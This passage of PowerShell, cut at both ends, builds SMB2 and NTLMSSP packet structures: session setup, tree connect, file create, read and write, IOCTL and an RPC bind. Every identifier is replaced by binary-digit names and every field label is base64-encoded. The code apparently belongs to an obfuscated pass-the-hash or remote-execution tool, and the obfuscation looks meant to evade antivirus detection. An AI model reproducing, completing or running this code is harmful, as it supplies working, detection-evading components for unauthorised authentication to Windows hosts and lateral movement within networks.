        ${00001000111101100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbABlAGMAdAA='))),[Byte[]](0x02,0x02))
        ${00001000111101100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbABlAGMAdAAyAA=='))),[Byte[]](0x10,0x02))
        return ${00001000111101100}
    }
    function _10010001111011001
    {
        param([Byte[]]${_10010111111100010})
        [Byte[]]${10010010000001101} = ([System.BitConverter]::GetBytes(${_10010111111100010}.Length))[0,1]
        ${01000001111101000} = New-Object System.Collections.Specialized.OrderedDictionary
        ${01000001111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x19,0x00))
        ${01000001111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00))
        ${01000001111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AbwBkAGUA'))),[Byte[]](0x01))
        ${01000001111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAHAAYQBiAGkAbABpAHQAaQBlAHMA'))),[Byte[]](0x00,0x00,0x00,0x00))
        ${01000001111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${01000001111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAdQBmAGYAZQByAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x58,0x00))
        ${01000001111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AEIAdQBmAGYAZQByAEwAZQBuAGcAdABoAA=='))),${10010010000001101})
        ${01000001111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAdgBpAG8AdQBzAFMAZQBzAHMAaQBvAG4ASQBEAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${01000001111101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${_10010111111100010})
        return ${01000001111101000} 
    }
    function _01111011001111111
    {
        param([Byte[]]${_10111000101101111})
        [Byte[]]${10000001011111011} = ([System.BitConverter]::GetBytes(${_10111000101101111}.Length))[0,1]
        ${01110000100001001} = New-Object System.Collections.Specialized.OrderedDictionary
        ${01110000100001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x09,0x00))
        ${01110000100001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
        ${01110000100001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaABPAGYAZgBzAGUAdAA='))),[Byte[]](0x48,0x00))
        ${01110000100001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaABMAGUAbgBnAHQAaAA='))),${10000001011111011})
        ${01110000100001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${_10111000101101111})
        return ${01110000100001001}
    }
    function _10100101010101111
    {
        param([Byte[]]${_10000110010010100})
        ${01110011101110101} = ([System.BitConverter]::GetBytes(${_10000110010010100}.Length))[0,1]
        ${10011101111110100} = New-Object System.Collections.Specialized.OrderedDictionary
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x39,0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQATwBwAGwAbwBjAGsATABlAHYAZQBsAA=='))),[Byte[]](0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgA='))),[Byte[]](0x02,0x00,0x00,0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAQwByAGUAYQB0AGUARgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAaQByAGUAZABBAGMAYwBlAHMAcwA='))),[Byte[]](0x03,0x00,0x00,0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAHQAdAByAGkAYgB1AHQAZQBzAA=='))),[Byte[]](0x80,0x00,0x00,0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAEEAYwBjAGUAcwBzAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUARABpAHMAcABvAHMAaQB0AGkAbwBuAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUATwBwAHQAaQBvAG4AcwA='))),[Byte[]](0x40,0x00,0x00,0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQBPAGYAZgBzAGUAdAA='))),[Byte[]](0x78,0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQBMAGUAbgBnAHQAaAA='))),${01110011101110101})
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAQwBvAG4AdABlAHgAdABzAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAQwBvAG4AdABlAHgAdABzAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10011101111110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${_10000110010010100})
        return ${10011101111110100}
    }
    function _01110101010111110
    {
        param ([Byte[]]${_01111000000111011})
        ${10010001010101110} = New-Object System.Collections.Specialized.OrderedDictionary
        ${10010001010101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x31,0x00))
        ${10010001010101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGQAZABpAG4AZwA='))),[Byte[]](0x50))
        ${10010001010101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00))
        ${10010001010101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),[Byte[]](0x00,0x00,0x10,0x00))
        ${10010001010101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${10010001010101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_01111000000111011})
        ${10010001010101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AaQBtAHUAbQBDAG8AdQBuAHQA'))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10010001010101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10010001010101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AYQBpAG4AaQBuAGcAQgB5AHQAZQBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10010001010101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAGgAYQBuAG4AZQBsAEkAbgBmAG8ATwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00))
        ${10010001010101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAGgAYQBuAG4AZQBsAEkAbgBmAG8ATABlAG4AZwB0AGgA'))),[Byte[]](0x00,0x00))
        ${10010001010101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),[Byte[]](0x30))
        return ${10010001010101110}
    }
    function _11000000110000001
    {
        param([Byte[]]${_01111000000111011},[Int]${_10111001011010110})
        [Byte[]]${10100110001001111} = [System.BitConverter]::GetBytes(${_10111001011010110})
        ${10111000011100001} = New-Object System.Collections.Specialized.OrderedDictionary
        ${10111000011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x31,0x00))
        ${10111000011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBPAGYAZgBzAGUAdAA='))),[Byte[]](0x70,0x00))
        ${10111000011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),${10100110001001111})
        ${10111000011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${10111000011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_01111000000111011})
        ${10111000011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbAA='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10111000011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AYQBpAG4AaQBuAGcAQgB5AHQAZQBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10111000011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEMAaABhAG4AbgBlAGwASQBuAGYAbwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00))
        ${10111000011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEMAaABhAG4AbgBlAGwASQBuAGYAbwBMAGUAbgBnAHQAaAA='))),[Byte[]](0x00,0x00))
        ${10111000011100001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        return ${10111000011100001}
    }
    function _10010111100111001
    {
        param ([Byte[]]${_01111000000111011})
        ${10110101001010111} = New-Object System.Collections.Specialized.OrderedDictionary
        ${10110101001010111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x18,0x00))
        ${10110101001010111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00))
        ${10110101001010111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${10110101001010111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_01111000000111011})
        return ${10110101001010111}
    }
    function _01001101010010100
    {
        ${01111111001001110} = New-Object System.Collections.Specialized.OrderedDictionary
        ${01111111001001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x04,0x00))
        ${01111111001001110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
        return ${01111111001001110}
    }
    function _01101010011100001
    {
        ${01010110000101100} = New-Object System.Collections.Specialized.OrderedDictionary
        ${01010110000101100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x04,0x00))
        ${01010110000101100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
        return ${01010110000101100}
    }
    function _00010001100001000
    {
        param ([Byte[]]${_00010111010010000},[Byte[]]${_01111110000000010},[Byte[]]${_10110111111001011},[Byte[]]${_01100111101011010},[Byte[]]${_01111000000111011},[Int]${_10111000101101111})
        [Byte[]]${00011001011001010} = ,0x00 * ${_10111000101101111}
        ${01101111101010110} = New-Object System.Collections.Specialized.OrderedDictionary
        ${01101111101010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x29,0x00))
        ${01101111101010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGYAbwBUAHkAcABlAA=='))),${_00010111010010000})
        ${01101111101010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAG4AZgBvAEMAbABhAHMAcwA='))),${_01111110000000010})
        ${01101111101010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQAQgB1AGYAZgBlAHIATABlAG4AZwB0AGgA'))),${_10110111111001011})
        ${01101111101010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AEIAdQBmAGYAZQByAE8AZgBmAHMAZQB0AA=='))),${_01100111101011010})
        ${01101111101010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
        ${01101111101010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHAAdQB0AEIAdQBmAGYAZQByAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${01101111101010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAaQB0AGkAbwBuAGEAbABJAG4AZgBvAHIAbQBhAHQAaQBvAG4A'))),[Byte[]](0x00,0x00,0x00,0x00))
        ${01101111101010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${01101111101010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBJAEQA'))),${_01111000000111011})
        if(${_10111000101101111} -gt 0)
        {
            ${01101111101010110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB1AGYAZgBlAHIA'))),${00011001011001010})
        }
        return ${01101111101010110}
    }
    function _01011111011010011
{
    param([Byte[]]${_01101010010001000},[Byte[]]${_00001101001110010},[Int]${_00000000001100111},[Int]${_10100001101110100})
    [Byte[]]${00111100011010000} = [System.BitConverter]::GetBytes(${_00000000001100111} + 24)
    [Byte[]]${10011101111010001} = [System.BitConverter]::GetBytes(${_10100001101110100})
    ${10111110111101110} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x39,0x00))
    ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
    ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AG4AYwB0AGkAbwBuAA=='))),${_01101010010001000})
    ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBVAEkARABIAGEAbgBkAGwAZQA='))),${_00001101001110010})
    ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBPAGYAZgBzAGUAdAA='))),[Byte[]](0x78,0x00,0x00,0x00))
    ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBMAGUAbgBnAHQAaAA='))),${00111100011010000})
    ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgASQBvAGMAdABsAEkAbgBTAGkAegBlAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQARABhAHQAYQBfAE8AZgBmAHMAZQB0AA=='))),[Byte[]](0x78,0x00,0x00,0x00))
    ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQARABhAHQAYQBfAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgASQBvAGMAdABsAE8AdQB0AFMAaQB6AGUA'))),${10011101111010001})
    ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00,0x00,0x00))
    if(${10011101111010001} -eq 40)
    {
        ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBDAGEAcABhAGIAaQBsAGkAdABpAGUAcwA='))),[Byte[]](0x7f,0x00,0x00,0x00))
        ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBDAGwAaQBlAG4AdABHAFUASQBEAA=='))),[Byte[]](0xc7,0x11,0x73,0x1e,0xa5,0x7d,0x39,0x47,0xaf,0x92,0x2d,0x88,0xc0,0x44,0xb1,0x1e))
        ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBTAGUAYwB1AHIAaQB0AHkATQBvAGQAZQA='))),[Byte[]](0x01))
        ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBVAG4AawBuAG8AdwBuAA=='))),[Byte[]](0x00))
        ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBEAGkAYQBsAGUAYwB0AEMAbwB1AG4AdAA='))),[Byte[]](0x02,0x00))
        ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBEAGkAYQBsAGUAYwB0AA=='))),[Byte[]](0x02,0x02))
        ${10111110111101110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAEQAYQB0AGEAXwBEAGkAYQBsAGUAYwB0ADIA'))),[Byte[]](0x10,0x02))
    }
    return ${10111110111101110}
}
    function _01001111110101010
    {
        param([Byte[]]${_00000100011001110},[Byte[]]${_10101010000000101})
        [Byte[]]${01010001101001000} = ([System.BitConverter]::GetBytes(${_10101010000000101}.Length + 32))[0]
        [Byte[]]${01000010100111010} = ${01010001101001000}[0] + 32
        [Byte[]]${10001000010111110} = ${01010001101001000}[0] + 22
        [Byte[]]${10101101100011001} = ${01010001101001000}[0] + 20
        [Byte[]]${00111100011010100} = ${01010001101001000}[0] + 2
        ${00100100010011000} = New-Object System.Collections.Specialized.OrderedDictionary
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABpAGEAbABDAG8AbgB0AGUAeAB0AFQAbwBrAGUAbgBJAEQA'))),[Byte[]](0x60))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdABpAGEAbABjAG8AbgB0AGUAeAB0AFQAbwBrAGUAbgBMAGUAbgBnAHQAaAA='))),${01000010100111010})
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwBNAGUAYwBoAEkARAA='))),[Byte[]](0x06))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwBNAGUAYwBoAEwAZQBuAGcAdABoAA=='))),[Byte[]](0x06))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBJAEQA'))),[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEkARAA='))),[Byte[]](0xa0))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEwAZQBuAGcAdABoAA=='))),${10001000010111110})
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEkARAAyAA=='))),[Byte[]](0x30))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAG4AZQByAEMAbwBuAHQAZQB4AHQAVABvAGsAZQBuAEwAZQBuAGcAdABoADIA'))),${10101101100011001})
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMASQBEAA=='))),[Byte[]](0xa0))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMATABlAG4AZwB0AGgA'))),[Byte[]](0x0e))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMASQBEADIA'))),[Byte[]](0x30))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMATABlAG4AZwB0AGgAMgA='))),[Byte[]](0x0c))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMASQBEADMA'))),[Byte[]](0x06))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAHMATABlAG4AZwB0AGgAMwA='))),[Byte[]](0x0a))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAHkAcABlAA=='))),[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAG8AawBlAG4ASQBEAA=='))),[Byte[]](0xa2))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGMAaABUAG8AawBlAG4ATABlAG4AZwB0AGgA'))),${00111100011010100})
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABJAEQA'))),[Byte[]](0x04))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABMAGUAbgBnAHQAaAA='))),${01010001101001000})
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAZgBpAGUAcgA='))),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBUAHkAcABlAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUARgBsAGEAZwBzAA=='))),${_00000100011001110})
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ARABvAG0AYQBpAG4A'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ATgBhAG0AZQA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        if(${_10101010000000101})
        {
            ${00100100010011000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),${_10101010000000101})
        }
        return ${00100100010011000}
    }
    function _10000011000110001
    {
        param([Byte[]]${_00111001011000100})
        [Byte[]]${01010001101001000} = ([System.BitConverter]::GetBytes(${_00111001011000100}.Length))[1,0]
        [Byte[]]${01000010100111010} = ([System.BitConverter]::GetBytes(${_00111001011000100}.Length + 12))[1,0]
        [Byte[]]${10001000010111110} = ([System.BitConverter]::GetBytes(${_00111001011000100}.Length + 8))[1,0]
        [Byte[]]${10101101100011001} = ([System.BitConverter]::GetBytes(${_00111001011000100}.Length + 4))[1,0]
        ${00001011110100000} = New-Object System.Collections.Specialized.OrderedDictionary
        ${00001011110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ASQBEAA=='))),[Byte[]](0xa1,0x82))
        ${00001011110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ATABlAG4AZwB0AGgA'))),${01000010100111010})
        ${00001011110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ASQBEADIA'))),[Byte[]](0x30,0x82))
        ${00001011110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ATABlAG4AZwB0AGgAMgA='))),${10001000010111110})
        ${00001011110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ASQBEADMA'))),[Byte[]](0xa2,0x82))
        ${00001011110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBTAE4ATABlAG4AZwB0AGgAMwA='))),${10101101100011001})
        ${00001011110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABJAEQA'))),[Byte[]](0x04,0x82))
        ${00001011110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABMAGUAbgBnAHQAaAA='))),${01010001101001000})
        ${00001011110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBSAGUAcwBwAG8AbgBzAGUA'))),${_00111001011000100})
        return ${00001011110100000}
    }
    function _10011111111001010
    {
        param([Byte[]]${_10110110100010111},[Int]${_01001000001010111},[Byte[]]${_10101111010010000},[Byte[]]${_10010010001101000},[Byte[]]${_00000111111011110},[Byte[]]${_00010111001011000})
        [Byte[]]${00111010111001010} = [System.BitConverter]::GetBytes(${_01001000001010111})
        ${01110010100110101} = New-Object System.Collections.Specialized.OrderedDictionary
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),[Byte[]](0x05))
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGkAbgBvAHIA'))),[Byte[]](0x00))
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQAVAB5AHAAZQA='))),[Byte[]](0x0b))
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQARgBsAGEAZwBzAA=='))),[Byte[]](0x03))
        ${01110010100110101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBSAGUAcAByAGUAcwBlAG4AdABhAHQAaQBvAG4A'))),[Byte[]](0x10,0x00,0x00,0x00))
